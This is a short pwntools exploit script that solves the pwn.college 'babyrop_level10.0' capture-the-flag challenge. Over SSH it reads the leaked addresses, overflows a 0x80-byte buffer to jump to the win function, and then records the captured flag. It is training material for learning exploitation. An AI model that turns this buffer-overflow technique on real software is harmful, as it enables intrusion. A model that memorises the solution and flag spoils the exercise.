from pwn import *

elf = context.binary = ELF("./babyrop_level10.0")
libc = ELF("./libc.so.6", checksec=False)
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")

io = s.process("/challenge/babyrop_level10.0")

io.recvuntil(b'[LEAK] Your input buffer is located at: ')
buf = int(io.recvline().strip()[:-1], 16)

io.recvuntil(b'The win function has just been dynamically constructed at ')
win = int(io.recvline().strip()[:-1], 16)

io.send(b'a'*0x80 + p64(win))
io.interactive()
# Flag: pwn.college{IPaLp7xmY4BEhmOKLf9LK9Ybeg10.Z.0VO1MDLxIjNyEzW}
